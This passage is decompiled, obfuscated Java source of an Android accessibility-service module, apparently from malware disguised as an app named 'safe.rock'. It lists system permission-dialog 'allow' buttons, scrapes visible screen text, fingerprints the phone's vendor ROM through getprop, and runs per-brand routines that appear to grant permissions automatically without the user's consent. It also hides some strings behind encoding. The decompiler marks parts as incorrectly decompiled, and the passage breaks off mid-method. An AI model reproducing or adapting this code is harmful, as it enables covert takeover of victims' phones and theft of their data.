package com.storm.safe.rock.service.modules.yw5xud;

import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.content.Context;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.telephony.TelephonyManager;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.base.AbstractC0330a0;
import com.storm.safe.rock.util.StringUtil;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import kotlin.AbstractC0767a0;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.text.AbstractC0779a1;
import kotlin.text.Regex;
import kotlin.text.RegexOption;
import okhttp3.internal.p032ws.WebSocketProtocol;
import org.conscrypt.FileClientSessionCache;
import p000.AbstractC0003a2;
import p000.AbstractC0134bh;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.C0127ba;
import p000.C1351vv;
import p000.RunnableC0449ea;
import p000.RunnableC1052p1;
import p000.b81;
import p000.dh0;
import p000.ij1;
import p000.kg1;
import p000.oe0;
import p000.pl0;
import p000.s60;
import p000.t60;
import p000.tz0;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.yw5xud.a9 */
/* loaded from: classes2.dex */
public final class C0372a9 extends AbstractC0330a0 {

    /* renamed from: a3 */
    public final String f55146a3;

    /* renamed from: a4 */
    public final Handler f55147a4;

    /* renamed from: a5 */
    public final String f55148a5;

    /* renamed from: a6 */
    public volatile boolean f55149a6;

    /* renamed from: a7 */
    public long f55150a7;

    /* renamed from: a8 */
    public final long f55151a8;

    /* renamed from: a9 */
    public volatile boolean f55152a9;

    /* renamed from: b0 */
    public volatile long f55153b0;

    /* renamed from: b1 */
    public final List f55154b1;

    /* renamed from: b2 */
    public final y90 f55155b2;

    /* renamed from: b3 */
    public long f55156b3;

    /* renamed from: b4 */
    public final long f55157b4;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public C0372a9(dqtvuisjd dqtvuisjdVar, Context context) {
        super(dqtvuisjdVar, context);
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(context, "context");
        this.f55146a3 = "Yw5xudHandler";
        HandlerThread handlerThread = new HandlerThread("Yw5xudBg");
        handlerThread.start();
        this.f55147a4 = new Handler(handlerThread.getLooper());
        StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM=");
        StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo");
        StringUtil.m212470a0("KFYcdEQpAyEZIi5aBChI");
        StringUtil.m212470a0("KFYcdFsxGiEZIipfFDlINhgrRQ==");
        StringUtil.m212470a0("KFYcdFsxGiEZMClc");
        StringUtil.m212470a0("KFYcdE43ACFFPjgXATJCNgkjVj8qXhQo");
        StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw==");
        StringUtil.m212470a0("KFYcdFsxGiEZIS5LHDNeKwUhWTwqVxA9SCo=");
        this.f55148a5 = "Yw5xudAuthHandler";
        this.f55151a8 = 300L;
        this.f55154b1 = AbstractC0716jf.m213306g5("com.android.permissioncontroller:id/permission_allow_button", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_one_time_button", "com.google.android.permissioncontroller:id/permission_allow_button", "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.google.android.permissioncontroller:id/permission_allow_one_time_button", "com.android.packageinstaller:id/permission_allow_button", "com.google.android.packageinstaller:id/permission_allow_button", "android:id/button1", "com.android.settings:id/action_button");
        this.f55155b2 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.Yw5xudAuthorizationHandler$PERMISSION_ALLOW_TEXTS$2
            @Override // p000.w00
            public final Object invoke() {
                return dh0.m212602a1();
            }
        });
        this.f55157b4 = 300L;
    }

    /* renamed from: a6 */
    public static void m212438a6(AccessibilityNodeInfo accessibilityNodeInfo, LinkedHashSet linkedHashSet) {
        String string;
        String string2;
        String string3;
        String string4;
        C0127ba c0127ba = new C0127ba();
        c0127ba.addLast(new ij1(accessibilityNodeInfo, 0));
        int i = 0;
        while (!c0127ba.isEmpty() && linkedHashSet.size() < 50 && i < 200) {
            try {
                ij1 ij1Var = (ij1) c0127ba.removeLast();
                AccessibilityNodeInfo accessibilityNodeInfo2 = ij1Var.f56906a0;
                int i2 = ij1Var.f56907a1;
                i++;
                try {
                    if (accessibilityNodeInfo2.isVisibleToUser()) {
                        CharSequence text = accessibilityNodeInfo2.getText();
                        if (text != null && (string3 = text.toString()) != null && (string4 = AbstractC0779a1.m213687e0(string3).toString()) != null) {
                            if (string4.length() <= 0) {
                                string4 = null;
                            }
                            if (string4 != null) {
                                linkedHashSet.add(string4);
                            }
                        }
                        CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                        if (contentDescription != null && (string = contentDescription.toString()) != null && (string2 = AbstractC0779a1.m213687e0(string).toString()) != null) {
                            String str = string2.length() > 0 ? string2 : null;
                            if (str != null) {
                                linkedHashSet.add(str);
                            }
                        }
                    }
                    if (i2 < 10) {
                        int childCount = accessibilityNodeInfo2.getChildCount();
                        if (childCount > 15) {
                            childCount = 15;
                        }
                        for (int i3 = 0; i3 < childCount; i3++) {
                            AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i3);
                            if (child != null) {
                                c0127ba.addLast(new ij1(child, i2 + 1));
                            }
                        }
                    }
                } catch (Exception unused) {
                }
            } catch (Exception unused2) {
                return;
            }
        }
    }

    /* renamed from: a7 */
    public static String m212439a7() throws Throwable {
        try {
            String strM212441b6 = m212441b6("ro.miui.ui.version.name");
            if (strM212441b6 == null || strM212441b6.length() == 0) {
                String strM212441b62 = m212441b6("ro.build.version.emui");
                String strM212441b63 = m212441b6("ro.build.version.harmony");
                String strM212441b64 = m212441b6("ro.build.version.magic");
                if ((strM212441b62 == null || strM212441b62.length() == 0) && ((strM212441b63 == null || strM212441b63.length() == 0) && (strM212441b64 == null || strM212441b64.length() == 0))) {
                    String strM212441b65 = m212441b6("ro.build.version.opporom");
                    String strM212441b66 = m212441b6("ro.build.version.realmeui");
                    String strM212441b67 = m212441b6("ro.oxygen.version");
                    if ((strM212441b65 == null || strM212441b65.length() == 0) && ((strM212441b66 == null || strM212441b66.length() == 0) && (strM212441b67 == null || strM212441b67.length() == 0))) {
                        String strM212441b68 = m212441b6("ro.vivo.os.version");
                        String strM212441b69 = m212441b6("ro.vivo.product.version");
                        if ((strM212441b68 == null || strM212441b68.length() == 0) && (strM212441b69 == null || strM212441b69.length() == 0)) {
                            String strM212441b610 = m212441b6("ro.build.version.oneui");
                            if (strM212441b610 == null || strM212441b610.length() == 0) {
                                String strM212441b611 = m212441b6("ro.build.display.id");
                                if (strM212441b611 != null) {
                                    String lowerCase = strM212441b611.toLowerCase(Locale.ROOT);
                                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                    if (AbstractC0779a1.m213652a5(lowerCase, "flyme", false)) {
                                    }
                                }
                                String str = Build.DISPLAY;
                                t60.m214694b5(str, "DISPLAY");
                                String lowerCase2 = str.toLowerCase(Locale.ROOT);
                                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                if (!AbstractC0779a1.m213652a5(lowerCase2, "miui", false) && !AbstractC0779a1.m213652a5(lowerCase2, "hyperos", false)) {
                                    if (!AbstractC0779a1.m213652a5(lowerCase2, "emui", false) && !AbstractC0779a1.m213652a5(lowerCase2, "harmonyos", false)) {
                                        if (!AbstractC0779a1.m213652a5(lowerCase2, "coloros", false) && !AbstractC0779a1.m213652a5(lowerCase2, "realme", false)) {
                                            if (!AbstractC0779a1.m213652a5(lowerCase2, "originos", false) && !AbstractC0779a1.m213652a5(lowerCase2, "funtouch", false)) {
                                                if (!AbstractC0779a1.m213652a5(lowerCase2, "oneui", false)) {
                                                    return AbstractC0779a1.m213652a5(lowerCase2, "flyme", false) ? "flyme" : "unknown";
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            return "oneui";
                        }
                        return "originos";
                    }
                    return "coloros";
                }
                return "emui";
            }
            return "miui";
        } catch (Exception e) {
            e.getMessage();
            return "unknown";
        }
    }

    /* renamed from: b5 */
    public static AccessibilityNodeInfo m212440b5(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
        } catch (Exception unused) {
        }
        if (!AbstractC0779a1.m213652a5(string, "CheckBox", false) && !AbstractC0779a1.m213652a5(string, "CompoundButton", false)) {
            AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
            if (parent == null) {
                return null;
            }
            int childCount = parent.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = parent.getChild(i);
                if (child != null) {
                    CharSequence className2 = child.getClassName();
                    if (className2 == null || (string2 = className2.toString()) == null) {
                        string2 = "";
                    }
                    if (!AbstractC0779a1.m213652a5(string2, "CheckBox", false) && !AbstractC0779a1.m213652a5(string2, "CompoundButton", false)) {
                        child.recycle();
                    }
                    parent.recycle();
                    return child;
                }
            }
            if (parent.isClickable()) {
                return parent;
            }
            parent.recycle();
            return null;
        }
        return accessibilityNodeInfo;
    }

    /* renamed from: b6 */
    public static String m212441b6(String str) throws Throwable {
        Process processExec;
        Process process = null;
        str = null;
        String str2 = null;
        try {
            processExec = Runtime.getRuntime().exec("getprop " + str);
            try {
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(processExec.getInputStream()));
                String line = bufferedReader.readLine();
                String string = line != null ? AbstractC0779a1.m213687e0(line).toString() : null;
                bufferedReader.close();
                if (string != null) {
                    if (string.length() != 0) {
                        str2 = string;
                    }
                }
                processExec.destroy();
                return str2;
            } catch (Exception unused) {
                if (processExec != null) {
                    processExec.destroy();
                }
                return null;
            } catch (Throwable th) {
                th = th;
                process = processExec;
                if (process != null) {
                    process.destroy();
                }
                throw th;
            }
        } catch (Exception unused2) {
            processExec = null;
        } catch (Throwable th2) {
            th = th2;
        }
    }

    /* renamed from: c1 */
    public static boolean m212442c1() {
        String str = Build.MANUFACTURER;
        t60.m214694b5(str, "MANUFACTURER");
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = Build.BRAND;
        t60.m214694b5(str2, "BRAND");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        return AbstractC0779a1.m213652a5(lowerCase, "meizu", false) || AbstractC0779a1.m213652a5(lowerCase2, "meizu", false);
    }

    /* renamed from: c2 */
    public static boolean m212443c2() {
        String str = Build.BRAND;
        t60.m214694b5(str, "BRAND");
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = Build.MANUFACTURER;
        t60.m214694b5(str2, "MANUFACTURER");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        return AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase, "redmi", false) || AbstractC0779a1.m213652a5(lowerCase, "poco", false) || AbstractC0779a1.m213652a5(lowerCase, "blackshark", false) || AbstractC0779a1.m213652a5(lowerCase2, "xiaomi", false);
    }

    /* renamed from: c3 */
    public static boolean m212444c3() {
        List list = pl0.f59305a0;
        String str = Build.MANUFACTURER;
        t60.m214694b5(str, "MANUFACTURER");
        Locale locale = Locale.ROOT;
        t60.m214694b5(locale, "ROOT");
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(locale)");
        String str2 = Build.BRAND;
        t60.m214694b5(str2, "BRAND");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(locale)");
        String str3 = Build.MODEL;
        t60.m214694b5(str3, "MODEL");
        String lowerCase3 = str3.toLowerCase(locale);
        t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(locale)");
        List<String> list2 = pl0.f59305a0;
        if (list2 == null || !list2.isEmpty()) {
            for (String str4 : list2) {
                if (AbstractC0779a1.m213652a5(lowerCase, str4, false) || AbstractC0779a1.m213652a5(lowerCase2, str4, false) || AbstractC0779a1.m213652a5(lowerCase3, str4, false)) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: c4 */
    public static boolean m212445c4() {
        String str = Build.MANUFACTURER;
        t60.m214694b5(str, "MANUFACTURER");
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = Build.BRAND;
        t60.m214694b5(str2, "BRAND");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        return AbstractC0779a1.m213652a5(lowerCase, "samsung", false) || AbstractC0779a1.m213652a5(lowerCase2, "samsung", false);
    }

    /* renamed from: c5 */
    public static boolean m212446c5() {
        String str = Build.MANUFACTURER;
        t60.m214694b5(str, "MANUFACTURER");
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = Build.BRAND;
        t60.m214694b5(str2, "BRAND");
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        return AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase2, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "iqoo", false) || AbstractC0779a1.m213652a5(lowerCase2, "iqoo", false);
    }

    /* JADX WARN: Code restructure failed: missing block: B:150:0x02ed, code lost:
    
        if (m212451a9(r2, r3, r9) == r10) goto L151;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:148:0x02de  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0025  */
    /* JADX WARN: Removed duplicated region for block: B:84:0x01b2  */
    /* JADX WARN: Type inference failed for: r18v0, types: [com.storm.safe.rock.service.modules.base.a0, com.storm.safe.rock.service.modules.yw5xud.a9] */
    /* JADX WARN: Type inference failed for: r3v10, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v11, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v12, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v13, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v14, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v15, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v16, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v17, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v23, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v6, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v7, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v8, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r3v9, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r4v0, types: [java.util.ArrayList, java.util.List] */
    /* JADX WARN: Type inference failed for: r4v1 */
    /* JADX WARN: Type inference failed for: r4v10, types: [java.util.List] */
    /* JADX WARN: Type inference failed for: r4v2 */
    /* JADX WARN: Type inference failed for: r4v26, types: [com.storm.safe.rock.service.modules.yw5xud.a9] */
    /* JADX WARN: Type inference failed for: r4v3, types: [com.storm.safe.rock.service.modules.yw5xud.a9, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r4v4 */
    /* JADX WARN: Type inference failed for: r4v44 */
    /* JADX WARN: Type inference failed for: r4v45 */
    /* JADX WARN: Type inference failed for: r4v9 */
    /* JADX WARN: Type inference failed for: r6v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r6v1 */
    /* JADX WARN: Type inference failed for: r6v11 */
    /* JADX WARN: Type inference failed for: r6v12 */
    /* JADX WARN: Type inference failed for: r6v7 */
    /* JADX WARN: Type inference failed for: r6v9, types: [com.storm.safe.rock.service.modules.yw5xud.a9] */
    @Override // com.storm.safe.rock.service.modules.base.AbstractC0330a0
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object mo211771a2(ArrayList arrayList, ArrayList arrayList2, ArrayList arrayList3, ContinuationImpl continuationImpl) throws Throwable {
        Yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1 yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1;
        C0372a9 c0372a9;
        C0372a9 c0372a92;
        ArrayList arrayList4;
        ArrayList arrayList5;
        List list;
        List list2;
        List list3;
        C0372a9 c0372a93;
        ArrayList arrayList6;
        ArrayList arrayList7 = arrayList;
        List list4 = arrayList2;
        ?? r4 = arrayList3;
        ?? r6 = "国际品牌 ";
        if (continuationImpl instanceof Yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) {
            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1 = (Yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) continuationImpl;
            int i = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6;
            if ((i & Integer.MIN_VALUE) != 0) {
                yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = i - Integer.MIN_VALUE;
            } else {
                yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1 = new Yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1(this, continuationImpl);
            }
        }
        Object obj = yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54998a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        try {
            try {
                switch (yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6) {
                    case 0:
                        kg1.m213544f4(obj);
                        m212462c7(true);
                        try {
                            t60.m214714d6(this.f55148a5, "🚀 [Yw5xud] 开始授权: " + Build.BRAND);
                            boolean zM212460c0 = m212460c0();
                            boolean zM212444c3 = m212444c3();
                            boolean zM212446c5 = m212446c5();
                            boolean zM212443c2 = m212443c2();
                            boolean zM212445c4 = m212445c4();
                            boolean zM212442c1 = m212442c1();
                            boolean zM212459b9 = m212459b9();
                            m212461c6(zM212459b9);
                            if (!zM212459b9) {
                                if (!zM212445c4) {
                                    if (!zM212460c0) {
                                        if (!zM212444c3) {
                                            if (!zM212446c5) {
                                                if (!zM212443c2) {
                                                    if (!zM212442c1) {
                                                        String strM212439a7 = m212439a7();
                                                        switch (strM212439a7.hashCode()) {
                                                            case 3117372:
                                                                if (!strM212439a7.equals("emui")) {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 15;
                                                                    if (m212450a8(arrayList7, list4, r4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                        break;
                                                                    }
                                                                    c0372a9 = this;
                                                                    break;
                                                                } else {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 10;
                                                                    break;
                                                                }
                                                            case 3351856:
                                                                if (!strM212439a7.equals("miui")) {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 15;
                                                                    if (m212450a8(arrayList7, list4, r4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                    }
                                                                    c0372a9 = this;
                                                                    break;
                                                                } else {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 9;
                                                                    if (m212453b1(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                        break;
                                                                    }
                                                                    c0372a9 = this;
                                                                }
                                                                break;
                                                            case 97536331:
                                                                if (!strM212439a7.equals("flyme")) {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 15;
                                                                    if (m212450a8(arrayList7, list4, r4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                    }
                                                                    c0372a9 = this;
                                                                    break;
                                                                } else {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 14;
                                                                    if (m212452b0(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                        break;
                                                                    }
                                                                    c0372a9 = this;
                                                                }
                                                                break;
                                                            case 105888634:
                                                                if (!strM212439a7.equals("oneui")) {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 15;
                                                                    if (m212450a8(arrayList7, list4, r4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                    }
                                                                    c0372a9 = this;
                                                                    break;
                                                                } else {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 13;
                                                                    if (m212455b3(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                        break;
                                                                    }
                                                                    c0372a9 = this;
                                                                }
                                                                break;
                                                            case 949547143:
                                                                if (!strM212439a7.equals("coloros")) {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 15;
                                                                    if (m212450a8(arrayList7, list4, r4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                    }
                                                                    c0372a9 = this;
                                                                    break;
                                                                } else {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 11;
                                                                    if (m212454b2(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                        break;
                                                                    }
                                                                    c0372a9 = this;
                                                                }
                                                                break;
                                                            case 1379044234:
                                                                if (!strM212439a7.equals("originos")) {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 15;
                                                                    if (m212450a8(arrayList7, list4, r4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                    }
                                                                    c0372a9 = this;
                                                                    break;
                                                                } else {
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 12;
                                                                    if (m212456b4(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                        break;
                                                                    }
                                                                    c0372a9 = this;
                                                                }
                                                                break;
                                                            default:
                                                                yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                                yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                                yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                                yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 15;
                                                                if (m212450a8(arrayList7, list4, r4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                                }
                                                                c0372a9 = this;
                                                                break;
                                                        }
                                                    } else {
                                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 8;
                                                        if (m212452b0(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                        }
                                                        c0372a9 = this;
                                                    }
                                                } else {
                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                    yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 7;
                                                    if (m212453b1(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                    }
                                                    c0372a9 = this;
                                                }
                                            } else {
                                                yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                                yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                                yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                                yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 6;
                                                if (m212456b4(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                                }
                                                c0372a9 = this;
                                            }
                                        } else {
                                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
                                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54995a1 = arrayList7;
                                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54996a2 = list4;
                                            yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f55000a6 = 5;
                                            if (m212454b2(arrayList7, list4, yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1) == coroutineSingletons) {
                                            }
                                            c0372a9 = this;
                                        }
                                    } else {
                                        yw5xudAuthorizationHandler$executeDeviceSpecificPermissions$1.f54994a0 = this;
